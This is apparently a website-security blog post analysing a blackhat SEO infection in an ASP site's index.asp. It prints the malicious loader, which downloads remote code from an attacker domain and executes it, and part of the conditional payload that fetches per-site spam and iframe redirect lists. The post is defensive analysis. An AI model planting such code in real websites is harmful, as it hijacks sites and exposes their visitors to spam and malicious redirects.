@@ -1,0 +1,87 @@
+Blackhat SEO and ASP Sites
+
+It’s all too easy to scream and holler at PHP based websites and the various malware variants associate with the technology, but perhaps we’re a bit too biased.
+Here is a quick post on ASP variant. Thought we’d give you Microsoft types some love too.
+Today we found this nice BlackHat SEO attack:
+
+Finding it was easy. The bad code was sitting at the beginning of index.asp begging for some attention:
+
+Server.ScriptTimeout=1500
+body=GetHtml("httx://seo-chat.biz/google/fileroot.txt")
+execute body
+Public Function GetHtml(url)
+Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
+ObjXMLHTTP.Open "GET",url,False
+ObjXMLHTTP.setRequestHeader "User-Agent",url
+ObjXMLHTTP.send
+GetHtml=ObjXMLHTTP.responseBody
+Set ObjXMLHTTP=Nothing
+set objStream = Server.CreateObject("Adodb.Stream")
+objStream.Type = 1
+objStream.Mode =3
+objStream.Open
+objStream.Write GetHtml
+objStream.Position = 0
+objStream.Type = 2
+objStream.Charset = "UTF-8"
+GetHtml = objStream.ReadText
+objStream.Close
+End Function
+
+The code is really straight forward, it creates a function called GetHtml, that downloads the content from httx://seo-chat.biz/google/fileroot.txt and executes it.
+Curious what the code is? Not to worry, it’s nothing more than an ASP variant of some good old conditional malware (image is a snippet).
+
+What I do find very interesting about this code is the following snippet:
+
+Refer= Request.ServerVariables("HTTP_REFERER") '// 父级来源地址
+user_agent=Request.ServerVariables("HTTP_USER_AGENT") '//服务器信息
+host=Request.ServerVariables("HTTP_HOST")
+ip=Request.ServerVariables("REMOTE_ADDR")
+
+http_host = host
+info = Request.ServerVariables("PATH_INFO")
+
+If InStr(http_host,"www") > 0 Then
+shellsite=right(http_host,len(http_host)-3-InStr(http_host,"www"))
+else
+shellsite=http_host
+end if
+
+base = "http://www.cheapspycamerasinc.info/google"
+indexurl = base&"/"&shellsite&"/index.php"
+
+object_str = base&"/"&shellsite&"/object.txt"
+if CheckURL(object_str) then
+ret_object = Trim(getHTTPPage(object_str))
+end if
+
+Each infected site has its own version of the spam content, only “valid” infected sites will download this spam code. You’ll find that the iframe injection is also there:
+
+jump_str = base&"/"&shellsite&"/jump.txt"
+'response.Write jump_str
+
+newcode = 0 '是否是新跳转代码
+
+if Len(ret_object)>3 and CheckURL(object_str) then
+open_urls = base&"/"&ret_object&"/url.txt" '跳转站列表
+'response.Write open_urls
+open_urls = getHTTPPage(open_urls)
+'随机取个站2013-08-23
+DomainTypeArray = split(open_urls,"|")
+Pathcoun = Ubound(DomainTypeArray)
+Randomize
+RndNumber = INT((Pathcoun+1)*RND)
+'response.Write DomainTypeArray(RndNumber)
+if instr(DomainTypeArray(RndNumber),"www")>0 then
+open_url = ""
+else
+open_url = ""
+end if
+newcode = 1
+else
+open_url = base&"/"&shellsite&"/url.txt" '唯一跳转代码
+end if
+
+It’s a good dynamic control of what to inject in the sites code.
+In short, all this to say, ASP is no better than PHP, there are equal number of variants on both technologies. We just write more about PHP as it’s one of the most prevalent technologies being consumed by everyday website owners, and their lovely Content Management Systems (CMS).
+Oh, and did anyone else notice, what appears to be, Chinese :)… ummmm….. ;P
